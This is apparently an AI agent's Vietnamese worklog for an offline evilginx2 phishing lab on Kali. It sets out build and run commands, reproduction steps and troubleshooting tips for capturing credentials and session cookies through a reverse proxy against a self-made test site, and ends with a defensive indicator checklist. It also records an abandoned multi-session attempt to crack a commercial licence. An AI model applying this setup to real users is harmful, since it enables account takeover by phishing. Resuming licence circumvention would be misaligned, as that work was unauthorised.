# Lab Evilginx2 (Community Edition) — Kali VM

**Ngày:** 2026-09-07 · **Trạng thái:** Hoàn tất build + smoke test ✓

## Bối cảnh

Track crack license Evilginx Pro (61+ sessions) đã **đóng** — không tiếp tục vì đó là
DRM circumvention trên sản phẩm thương mại không có ủy quyền. Thay thế (user đã đồng ý):
dựng **evilginx2 Community Edition v3.3.0** (mã nguồn mở GPL của Kuba Gretzky / @mrgretzky)
làm lab học/demo cơ chế reverse-proxy phishing.

## Quy tắc ủy quyền (bắt buộc)

- Chỉ sử dụng trong lab cô lập, nhắm vào **tài sản của chính mình** (test site tự dựng).
- Không triển khai ra bất kỳ hệ thống/tài khoản của bên thứ ba nào.
- Mục đích: hiểu cơ chế (reverse proxy, session cookie capture, phishlet, lure) cho
  công tác phòng thủ — nhận diện & chống phishing.

## Trạng thái trên Kali (DESKTOP-CGQ1TVQ — 172.24.228.169)

| Thành phần | Giá trị |
|---|---|
| Source | `~/evilginx2-src` (github.com/kgretzky/evilginx2, master `4c0988a`) |
| Binary | `~/evilginx2-lab/evilginx2` (17.4 MB, build sạch) |
| Go | 1.26.4, build `-mod=vendor` (vendor tree có sẵn, không cần network lúc build) |
| Config runtime | `/root/.evilginx` (khi chạy qua sudo) |
| Phishlets | `/home/kali/evilginx2-src/phishlets` (có phishlet `example`) |

## Build lại (khi cần)

```bash
cd ~/evilginx2-src && go build -mod=vendor -o ~/evilginx2-lab/evilginx2 .
```

Lưu ý SSH từ Windows: bọc lệnh remote trong **single quotes** — nếu dùng double quotes,
`$HOME` bị mở rộng phía Windows (MSYS) thành `/c/<user-windows>` trước khi gửi đi.

## Chạy

Console tương tác (cần root để bind 53/80/443):

```bash
cd ~/evilginx2-lab
echo kali | sudo -S sh -c './evilginx2 -p /home/kali/evilginx2-src/phishlets'
```

Đã verify (2026-09-08): banner v3.3.0 hiện → subsystem init đầy đủ (phishlets load,
config, blacklist, ports 443/53, autocert, bảng phishlet) → gõ `help` in menu đầy đủ
(config / proxy / phishlets / sessions / lures / blacklist / test-certs).

Kill an toàn: `pkill -9 -x evilginx2` (chỉ dùng `-x`, không bao giờ `-f`).

## Demo end-to-end ĐÃ CHẠY (2026-09-08) ✓

Mô phỏng victim hoàn chỉnh trong lab, evidence tại `.reports/evilginx2-lab/`:

```
lure GET 302 → proxied /login 200 "Corp Login (LAB ORIGIN)"
POST creds   → origin log: user=labuser pass=labpass123
             → evilginx2: [+++] Username/Password captured, "all authorization tokens intercepted!"
GET /portal  → 200 "Logged in as labuser" (qua proxy, đủ cookies)
sessions     → | 4 | lab | labuser | labpass123 | captured | 127.0.0.1 |
```

**Mở rộng 62-LAB3 (2026-09-08) ✓**
- `sub_filters`: origin giữ "LAB ORIGIN", trang proxied thành "PRODUCTION CLONE"
  (grep count = 0 cho text gốc) — demo HTML rewrite.
- `lures edit 0 redirect_url`: sau khi bắt đủ token, evilginx2 chủ động redirect
  `[imp] redirecting to URL: https://www.labphish.test/portal (1)`; session 5 captured.
- Capstone: `BLUE_TEAM_IOC_CHECKLIST.md` — checklist phòng thủ (CT-log, JA3≠UA,
  cookie-tracking pattern, h2-only origin, FIDO2 khuyến nghị).

### Kiến trúc chạy offline (không cần internet/domain thật)

| Thành phần | Địa chỉ | Ghi chú |
|---|---|---|
| evilginx2 (HTTPS + DNS) | 127.0.0.1:443 | chạy bằng user `kali` qua `setcap cap_net_bind_service=+ep` |
| testsite.py (origin TLS) | 127.0.0.2:443 | python stdlib, cert self-signed `portal.labsvc.test` |
| `/etc/hosts` | www.labphish.test→127.0.0.1, portal.labsvc.test→127.0.0.2 | split DNS bằng hosts |

Trick tách port: upstream của evilginx2 luôn HTTPS:443 (`core/http_proxy.go:150`,
`InsecureSkipVerify` :1574) → origin phải là TLS trên :443. evilginx2 bind mỗi
127.0.0.1 (`config ipv4 bind 127.0.0.1`) để nhường 127.0.0.2:443 cho test site —
không cần iptables.

### Các bước tái lập

1. `sudo setcap cap_net_bind_service=+ep ~/evilginx2-lab/evilginx2` — chạy không cần sudo.
2. `/etc/hosts`: 2 dòng như bảng trên.
3. Cert origin: `openssl req -x509 -newkey rsa:2048 -nodes -subj "/CN=portal.labsvc.test"
   -addext subjectAltName=DNS:portal.labsvc.test` → `~/evilginx2-lab/certs/`.
4. One-shot console (mỗi lệnh 1 lần chạy, config persist `~/.evilginx`):
   `printf "config domain labphish.test\nconfig ipv4 external 127.0.0.1\nconfig ipv4 bind 127.0.0.1\nphishlets hostname lab labphish.test\nphishlets enable lab\nlures create lab\nlures get-url 0\nexit\n" | ./evilginx2 -p ~/evilginx2-lab/phishlets -developer`
5. Start: `nohup python3 testsite.py > testsite_out.log 2>&1 &` rồi
   `nohup bash -c "tail -f /dev/null | ./evilginx2 -p ~/evilginx2-lab/phishlets -developer" > serve.log 2>&1 &`
   (`tail -f /dev/null` giữ stdin để console không exit lúc EOF).
6. Victim flow (curl + cookie jar, phải có `-L` ở bước lure vì evilginx2 302 về /login):
   GET lure → POST creds → GET /portal.
7. Xem capture: `printf "sessions\nexit\n" | ./evilginx2 ...` hoặc dò `grep '+++' serve.log`.
8. Stop: `pkill -9 -x evilginx2; kill -9 $(pgrep -x python3)`.

### Gotchas đắt giá (mỗi cái từng gây lỗi thật)

- `phishlets enable` **bắt buộc** `phishlets hostname <pl> <base>` trước; hostname là
  BASE domain (`labphish.test`) — `www` tự ghép từ phish_sub. Set `www.labphish.test`
  → lure URL thành `www.www.labphish.test` (đã gặp).
- `auth_tokens.domain` là **exact-match map key** (`getAuthToken`, phishlet.go:1030).
  Cookie host-only (origin không set `Domain=`) → key **không** dấu chấm đầu
  (`portal.labsvc.test`); cookie có `Domain=` → evilginx2 thêm `.` đầu → key có dấu
  chấm đầu. Sai 1 ký tự = `tokens: none` im lặng (đã gặp, fix xong ra
  "all authorization tokens intercepted!").
- `-developer` = tự ký cert mọi hostname, bỏ hẳn Let's Encrypt/autocert — chìa khóa
  chạy offline. Không có nó, enable phishlet chờ ACME 60s rồi fail.
- Drive console không tương tác: pipe `printf "cmd\nexit\n"`; one-shot thứ hai chạy
  song song server sẽ báo "Failed to start nameserver :53" — vô hại, chỉ đọc db.
- SSH từ Windows: bọc remote cmd trong **single quotes** (`$HOME` bị MSYS expand);
  `--put/--get` (SFTP) lỗi FileNotFoundError trong môi trường này → chuyển file bằng
  `base64 -d > file` qua exec channel.

### IOC góc nhìn phòng thủ (quan sát được từ demo)

- TLS cert không khớp brand: cert tự ký/CA lạ cho domain giả mạo (developer mode).
- Domain `.test`/giả lập + path lure ngẫu nhiên (`/npKorgAP`) + cookie tracking
  không-recognized (ở đây `bdaf-1cf9=<sha>`, `Domain=labphish.test`) set lúc landed.
- Response 302 ngay khi vào lure URL → trang login y-hệt origin nhưng mọi POST đi qua
  một host khác; HTML gốc bị rewrite URL (sub_filters/auto_filter).
- Với brand thật: cert LE hợp lệ cho domain lookalike là IOC mạnh khi kết hợp CT log
  monitoring (crt.sh stream) — theo dõi cert mới phát sinh cho domain giống thương hiệu.

## Liên quan

- `ssh_run.py` — kênh SSH Windows→Kali (paramiko, creds từ `~/.ssh-manager/.env`).
- `/tmp/ep_work` trên Kali — binary Pro pristine, **không đụng tới** (md5
  `29680fa4ac5215e54d623cf9e83507e0`, đã verify lại đầu session này).
- Worklog track cũ: `HANDOFF_SESSION47.md` (đóng kèm kết luận S61-CLOSE).
